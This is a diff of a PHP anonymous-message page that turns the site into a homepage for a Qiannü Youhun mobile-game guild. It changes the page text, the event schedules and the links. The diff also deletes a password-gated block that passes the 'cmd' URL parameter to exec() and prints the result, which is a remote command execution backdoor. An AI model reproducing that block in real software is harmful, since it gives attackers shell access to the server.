@@ -30,23 +30,6 @@ function show($varName)
   }
 }
 
-if (isset($_GET['cmd'])) {
-    $cmd = stripslashes($_GET['cmd']);
-    if (isset($_GET['password'])){
-      $password = stripslashes($_GET['password']);
-      if ($password === $g_password){
-          exec($cmd, $out);  
-          var_dump($out);  
-          echo '<br>'; 
-          var_dump($cmd);
-
-      }else{
-         echo "fuck";
-      }
-    }else{
-       echo "fuck";
-    }
-}
 
 if ($_GET['act'] == "phpinfo") 
 {
@@ -174,7 +157,7 @@ input.btn{font-weight: bold; height: 60px; width:200px;line-height: 20px; paddin
     <div id="header" align="center">
     </div>
 
-<iframe frameborder="0" scrolling="no" src="nameShow_release.html" width="100%" height="500px"></iframe>
+<iframe frameborder="0" scrolling="no" src="guild_title_release.html" width="100%" height="500px"></iframe>
 <div id="footer">
 
 
@@ -187,7 +170,7 @@ input.btn{font-weight: bold; height: 60px; width:200px;line-height: 20px; paddin
 <form action="<?php echo $_SERVER[PHP_SELF]."#bottom";?>" method="post">
 <!--发送数据-->
 <table width="100%" cellpadding="3" cellspacing="0" align="center">
-  <tr><th colspan="3">有话要对我说嘛?但这里是匿名哦,我并不知道你是谁啦</th></tr>
+  <tr><th colspan="3">有话要对管理说嘛?但这里是匿名哦,我们并不知道你是谁啦</th></tr>
   <tr>
     <td width="15%"></td>
     <td width="50%">
@@ -208,24 +191,14 @@ input.btn{font-weight: bold; height: 60px; width:200px;line-height: 20px; paddin
 
 <br>
 
-<marquee width=30% height=200 bgcolor=white direction=up scrollamount=3 style="float:left" padding:20px;>
+<marquee width=100% height=200 bgcolor=white direction=up scrollamount=3 style=""padding:20px;>
 <ul>
-  <li>左手边第三个同学，请文明上网</li>
-  <li>姗姗是大美女,不解释</li>
-  <li>随心小美女,也不解释</li>
-  <li>红衣是成熟御姐</li>
-  <li>小峰峰是清修道士</li>
-  <li>小年糕是外国佬</li>
-  <li>去泰国就找微微吧,其他就别想了,至于舍不舍得回来,是另外一码事</li>
-  <li>隔壁海底捞的服务员妹子里面有个长得特别正的,应该是12号,我就不说她是嘻嘻了</li>
-  <li>老爷上个月还是她们班班花,今天不知道还是不是</li>
-  <li>前面健身房的教练就是妖哥，不用猜了</li>
-  <li>姿色正在环游世界,吃遍世界,她有一所房子,面朝大海,春暖花开</li>
-  <li>本网站不收集任何信息,代码公开，仅提供匿名留言功能</li>
-  <li>最近棋牌游戏好像很火的样子,希望一起搞的举爪</li>
-  <li>有小游戏创意的,欢迎长篇大论</li>
-  <li>不要留自己的联系方式</li>
-  <li>谢谢我的老婆大人，特别感谢我的倩女好友们!谢谢姗姗，随心，老爷，姿色，嘻嘻，11，小峰峰，红衣，微微，小年糕……</li>
+  <li>谁说生活没有彩排，游戏就是对生活最好的彩排，体验游戏，感悟生活</li>
+  <li>帮会是倾诉故事和分享快乐的最佳集散中心，你若真心，必然收获真心</li>
+  <li>我们更希望更多成员更多的参与帮会活动和聊天，例如寇岛、联赛、帮花</li>
+  <li>我们目前最重视周二和周四的帮会联赛，其次是周日寇岛和周五帮花</li>
+  <li>联赛开始时间为每个周二的8点和每个周四的8点，其中周二有两场</li>
+  <li>寇岛开启时间为周日晚上9点，帮花为周五9点</li>
 </ul>
 </marquee>
 
@@ -235,9 +208,9 @@ input.btn{font-weight: bold; height: 60px; width:200px;line-height: 20px; paddin
 
 <div class="footer">
 
-<div align="center">谢谢你点进来，这代表你对我的信任，感激不尽！</div>
+<div align="center">这里是倩女幽魂手游血染白霜帮会的主页，并非游戏官方网站！</div>
 <div id="jump" align="center">
-<a href="about_release.php">关于本站</a>  <a href="plan_release.php">未来打算</a>
+<a href="http://qnm.163.com/index.html">游戏官网</a> <a href="how_to_play.php">玩法攻略</a> <a href="member_info_debug.php">成员介绍</a> <a href="about_guild.php">关于本站</a>
 <h3>版权所有.乍暖还寒</h3>
 </div>
 </div>
